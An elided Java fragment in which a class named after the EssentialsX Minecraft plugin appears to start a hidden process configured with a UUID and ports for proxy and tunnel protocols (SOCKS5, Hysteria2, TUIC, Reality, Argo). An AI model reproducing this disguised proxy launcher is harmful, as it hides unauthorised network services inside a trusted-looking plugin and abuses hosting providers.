...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "904150a1-2da4-46ff-b38a-01dc49f1bf10");
        ...
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "63329");
        env.put("HY2_PORT", "15290");
        env.put("TUIC_PORT", "63329");
        env.put("ANYTLS_PORT", "63329");
        env.put("REALITY_PORT", "41299");
